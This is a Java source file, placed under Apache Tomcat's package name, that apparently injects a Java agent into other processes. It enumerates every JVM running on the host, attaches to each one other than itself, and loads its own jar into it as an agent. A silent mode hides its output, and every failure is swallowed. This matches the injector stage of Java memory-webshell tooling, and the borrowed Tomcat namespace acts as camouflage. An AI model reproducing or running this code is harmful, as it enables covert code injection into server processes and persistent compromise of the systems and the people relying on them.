package org.apache.catalina.servlets;

import java.util.List;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class Attach {
    public static void main(String[] args) throws Exception {
        boolean print = true;
        System.setProperty("jdk.attach.allowAttachSelf", "true");
        String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        try {
            agentFile = java.net.URLDecoder.decode(agentFile, "UTF-8");
        } catch (Exception ignored) {}
        agentFile = new java.io.File(agentFile).getAbsolutePath();
        String agentArgs = agentFile;
        if (args.length > 0) {
            if (args[0].equals("ignored")){
                print = false;
            }
            agentArgs = agentArgs + "^" + args[0];
        }
        List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vmList) {
            String name = vmd.displayName();
            try {
                if (name.length() > 0 && !agentFile.contains(name)) {
                    if (print){
                        System.out.println("-------------------");
                        System.out.println("name >>> " + vmd.displayName());
                        System.out.println("id >>> " + vmd.id());
                    }
                    VirtualMachine vm = VirtualMachine.attach(vmd);
                    vm.loadAgent(agentFile, agentArgs);
                    vm.detach();
                    if (print){
                        System.out.println("success");
                    }
                }
            } catch (Exception ignored) {
                if (print){
                    System.out.println("fail");
                }
            }
        }
    }
}
